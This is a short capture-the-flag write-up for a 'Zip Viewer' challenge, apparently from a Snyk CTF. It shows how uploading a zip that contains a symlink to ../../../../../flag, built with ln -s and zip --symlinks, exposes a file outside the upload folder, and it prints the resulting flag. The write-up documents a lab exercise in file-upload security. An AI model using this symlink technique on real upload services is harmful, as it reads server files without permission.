
# Zip Viewer

Trying to upload a jpeg image I get this error message. It is unzipping the file you give it and then you can open it.

![image](https://user-images.githubusercontent.com/80063008/136174211-9703e9d5-d697-4825-90d1-99d4ec35c431.png)

Tried multiple things however creating a symlink is what worked: https://book.hacktricks.xyz/pentesting-web/file-upload#symlink

This is usually known as Zip Slip. 

On my machine I first created a file that was symlinked to the root, by going back a few folders and then going for the flag, assuming it is in root as it was in other challenges in this CTF.

```bash
ln -s ../../../../../flag symflag.txt
```
Compressed the file using the --symlinks argument and then upload it. Clicked on the symlinked file and got the flag.
```bash
zip --symlinks getflag.zip symflag.txt
```


![image](https://user-images.githubusercontent.com/80063008/136174276-f5c1f9a5-7151-4465-8a2a-e1fa444ea9fb.png)
![image](https://user-images.githubusercontent.com/80063008/136174285-fb8ea7a7-3336-4a40-b52a-52d1d7cb7eea.png)
![image](https://user-images.githubusercontent.com/80063008/136174294-66738ada-6423-492a-a4e2-e0449a30175d.png)






Flag: SNYK{d099a4c87b9ff06beabc0eb5ee186b93133fb2a9fff8d55582f932d1def8942c} 
